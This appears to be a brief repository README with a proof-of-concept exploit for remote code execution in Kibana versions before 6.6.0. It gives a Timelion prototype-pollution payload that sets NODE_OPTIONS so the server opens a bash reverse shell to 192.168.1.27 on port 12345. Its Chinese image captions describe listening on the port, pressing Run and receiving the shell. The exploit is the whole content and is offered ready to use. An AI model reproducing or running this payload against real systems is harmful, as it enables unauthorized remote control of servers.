# kibana-RCE <6.6.0
![监听端口](./微信图片编辑_20191018114455.jpg)
POC：

.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/192.168.1.27/12345 0>&1");process.exit()//')
.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')

![点击RUN按钮运行](./微信图片编辑_20191018114829.jpg)

![成功反弹shell](./微信截图_20191018114912.png)

